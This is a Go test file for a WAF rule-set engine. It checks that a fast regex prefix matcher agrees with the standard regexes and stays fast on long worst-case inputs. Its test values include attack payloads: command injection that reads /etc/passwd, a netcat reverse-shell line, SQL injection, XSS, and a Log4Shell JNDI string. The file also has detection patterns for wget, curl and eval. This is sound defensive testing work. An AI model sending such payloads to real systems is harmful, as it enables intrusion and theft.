package crs

import (
	"bufio"
	"fmt"
	"math/rand"
	"os"
	"regexp"
	"strings"
	"testing"
	"time"
)

// The fast matcher must agree with the regex on every value.
func TestStartsAgreesWithRegex(t *testing.T) {
	pats := []string{
		`(?i)(?:^|[;|&])\s*(?:cat|ls|id)\b`,
		`^abc|[;=]x`,
		`(?i)(?:b["']*u["']*s["']*y|[;=])\s*(?:wget|curl)[\s&|]`,
		`\$\{[a-z]+\}`,
		`(?:a|b)c$`,
		`x(?:y|\bz)`,
		`(?i)é|ß`,
		`\bfoo`,
		`\Bfoo`,
		`(?m)^foo`,
		`(?i)\b(?:eval|exec)\s*\(`,
		`^x|\bx`,
	}
	vals := []string{"", "a", "abc", ";ls", "x;ls -la", "foo=bar;cat /etc/passwd", "ID", "a ;  id", "b\"u's'ywget ", "=curl&",
		"${user}", "$${x}", "ac", "bc", "zzac", "xz", "x z", "xy", "É", "SS", "ẞ", "xß", "\xff;ls", "é;id",
		"foo", "afoo", " foo", "a\nfoo", "éfoo", "\xfffoo", "x eval(", "xeval(", "EXEC (", "ax", "a x", "x"}
	for _, p := range pats {
		re := regexp.MustCompile(p)
		s := newStarts(p, re)
		if s == nil {
			continue
		}
		for _, v := range vals {
			if s.MatchString(v) != re.MatchString(v) {
				t.Errorf("%q on %q: fast %v, regex %v", p, v, s.MatchString(v), re.MatchString(v))
			}
		}
	}
	if newStarts(`a?`, nil) != nil || newStarts(`.x`, nil) != nil || newStarts(`\b`, nil) != nil {
		t.Error("unsuited regex accepted")
	}
}

// Against the real Core Rule Set: every @rx with a fast matcher, on real
// traffic values (SENTINEL_VALUES, one per line) and random mutations.
func TestStartsAgreesOnCRS(t *testing.T) {
	s, err := Load(crsDir(t), 4)
	if err != nil {
		t.Fatal(err)
	}
	var ops []*operator
	for _, ph := range s.phases {
		for _, r := range ph {
			for c := r; c != nil; c = c.chain {
				if c.op != nil && c.op.fast != nil {
					ops = append(ops, c.op)
				}
			}
		}
	}
	t.Logf("%d regexes have a fast matcher", len(ops))
	vals := []string{"", ";", "a;ls -la", "x=1&y=$(id)", "busybox wget http://e", "b\\u\\s\\y\\b\\o\\x cat /etc/passwd",
		"1' or '1'='1", "<script>alert(1)</script>", "{{7*7}}", "${jndi:ldap://x}", "../../etc/passwd", "| nc -e /bin/sh 1.2.3.4 4444"}
	if f := os.Getenv("SENTINEL_VALUES"); f != "" {
		fh, err := os.Open(f)
		if err != nil {
			t.Fatal(err)
		}
		sc := bufio.NewScanner(fh)
		sc.Buffer(make([]byte, 1<<20), 1<<20)
		for sc.Scan() {
			vals = append(vals, sc.Text())
		}
		fh.Close()
	}
	rng := rand.New(rand.NewSource(1))
	alpha := ";|&$(){}[]<>=`'\"\\/ \n\tabcdeilnoprstuwxyz.-0123456789%"
	for i := 0; i < 3000; i++ {
		var b strings.Builder
		for j := rng.Intn(40); j > 0; j-- {
			b.WriteByte(alpha[rng.Intn(len(alpha))])
		}
		vals = append(vals, b.String())
		v := vals[rng.Intn(12)]
		if len(v) > 0 {
			k := rng.Intn(len(v))
			vals = append(vals, v[:k]+b.String()+v[k:])
		}
	}
	bad := 0
	for _, op := range ops {
		for _, v := range vals {
			if op.fast.MatchString(v) != op.re.MatchString(v) {
				bad++
				if bad < 10 {
					t.Errorf("%.80q on %.80q: fast %v", op.param, v, op.fast.MatchString(v))
				}
			}
		}
	}
}

// A long value full of possible start positions must not cost much more
// than the plain regex (it once cost minutes: every anchored run read to
// the end of the value).
func TestStartsWorstCase(t *testing.T) {
	s, err := Load(crsDir(t), 4)
	if err != nil {
		t.Fatal(err)
	}
	vals := []string{
		strings.Repeat("b=aaaaaaaaaa", 20000),
		strings.Repeat("=", 100000),
		strings.Repeat("c", 100000),
		strings.Repeat("ls -", 30000),
		strings.Repeat("a;", 50000),
		strings.Repeat(";", 30) + strings.Repeat("abcdefghij", 20000),
		strings.Repeat("=c", 15) + strings.Repeat("x/y-z.", 30000),
		strings.Repeat("b", 30) + strings.Repeat("0123456789", 20000),
	}
	var fast, plain, worst time.Duration
	worstOp := ""
	for _, ph := range s.phases {
		for _, r := range ph {
			for c := r; c != nil; c = c.chain {
				if c.op == nil || c.op.fast == nil {
					continue
				}
				for _, v := range vals {
					t0 := time.Now()
					a := c.op.fast.MatchString(v)
					t1 := time.Now()
					b := c.op.re.MatchString(v)
					tf, tp := t1.Sub(t0), time.Since(t1)
					fast, plain = fast+tf, plain+tp
					if tf > worst && tf > 3*tp {
						worst, worstOp = tf, fmt.Sprintf("%.50q on %d bytes: fast %v, plain %v", c.op.param, len(v), tf, tp)
					}
					if a != b {
						t.Errorf("%.60q: fast %v, regex %v", c.op.param, a, b)
					}
				}
			}
		}
	}
	t.Logf("fast %v, plain %v; worst single: %s", fast, plain, worstOp)
	if worst > 100*time.Millisecond {
		t.Errorf("one regex took %s", worstOp)
	}
	if fast > 2*plain+time.Second {
		t.Errorf("fast path %v, plain regex %v", fast, plain)
	}
}
